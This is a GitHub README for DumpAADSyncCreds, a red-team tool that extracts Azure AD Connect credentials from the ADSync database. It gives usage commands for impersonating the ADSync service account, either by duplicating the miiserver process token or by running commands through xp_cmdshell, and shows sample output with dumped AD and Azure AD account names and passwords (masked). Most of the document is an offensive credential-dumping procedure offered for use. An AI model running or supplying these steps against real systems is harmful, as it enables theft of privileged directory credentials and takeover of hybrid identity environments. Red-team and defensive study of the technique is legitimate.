# DumpAADSyncCreds
DumpAADSyncCreds is C# implementation of Get-AADIntSyncCredentials from [AADInternals](https://github.com/Gerenios/AADInternals), which extracts Azure AD Connect credentials to AD and Azure AD from AAD connect database.

In late 2019, a change on key storage was deployed such that only ADSync service account could access the key to decrypt configuration file from database.

DumpAADSyncCreds provides two ways to impersonate as ADSync service account:

- execute command via xp_cmdshell by [Adam Chester](https://blog.xpnsec.com/azuread-connect-for-redteam/)
- copy token from miiserver process via DuplicateToken API call by AADInternals

## Usage

```shell
cmd> set PATH=%PATH%;C:\Program Files\Microsoft Azure AD Sync\Bin;
cmd> .\DumpAADSyncCreds.exe print_help
DumpAADSyncCreds
More info: https://github.com/Hagrid29/DumpAADSyncCreds
Example:
        set PATH=%PATH%;C:\Program Files\Microsoft Azure AD Sync\Bin;
        DumpAADSyncCreds.exe get_token
Options:
Dump AAD connect account credential in current context:
        DumpAADSyncCreds.exe [raw_output]
Copy token of ADSync service account and dump AAD connect account credential:
        DumpAADSyncCreds.exe get_token [raw_output]
Execute command as ADSync service account via xp_cmdshell:
        DumpAADSyncCreds.exe xp_cmd "\"C:\Program Files\Microsoft Azure AD Sync\Bin\DumpAADSyncCreds.exe\""
Print status of ADSync service:
        DumpAADSyncCreds.exe check_service
```

Duplicate token of ADSync service account

```shell
cmd> .\DumpAADSyncCreds.exe get_token
[+] Opening database: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync
[+] Obtained ADSync service account token from miiserver process...
==========   AD configuration   ==========
AD Domain 1: XXXXXXX
AD User 1: MSOL_XXXXXXX
AD Password 1: XXXXXXX

==========   AAD configuration   ==========
AAD User 1: Sync_XXXXXXX_XXXXXXX@XXXXXXX.onmicrosoft.com
AAD Password 1: XXXXXXX
```

Execute xp_cmdshell

```shell
cmd> DumpAADSyncCreds.exe xp_cmd "\"C:\Program Files\Microsoft Azure AD Sync\Bin\DumpAADSyncCreds.exe\""
[+] Opening database: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync
[+] Executed command: EXEC xp_cmdshell '"C:\Program Files\Microsoft Azure AD Sync\Bin\DumpAADSyncCreds.exe"'
[+] Opening database: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync
==========   AD configuration   ==========
AD Domain 1: XXXXXXX
AD User 1: MSOL_XXXXXXX
AD Password 1: XXXXXXX

==========   AAD configuration   ==========
AAD User 1: Sync_XXXXXXX_XXXXXXX@XXXXXXX.onmicrosoft.com
AAD Password 1: XXXXXXX
```

Print ADSync service status

```shell
cmd> .\DumpAADSyncCreds.exe check_service
Is ADSync service running:      True
ADSync bin path:                C:\Program Files\Microsoft Azure AD Sync\bin\
ADSync service account:         XXXXXXX
ADSync version:                 1.6.16.0
*** ADSync passwords can be read or modified as local administrator only for ADSync version 1.3.xx.xx
```

## Improvement

- Dirk-jan found a way to remote dump AAD connect account credentials with RPC call. Check details in his [blog post](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)

## References

* https://github.com/Gerenios/AADInternals
* https://blog.xpnsec.com/azuread-connect-for-redteam/

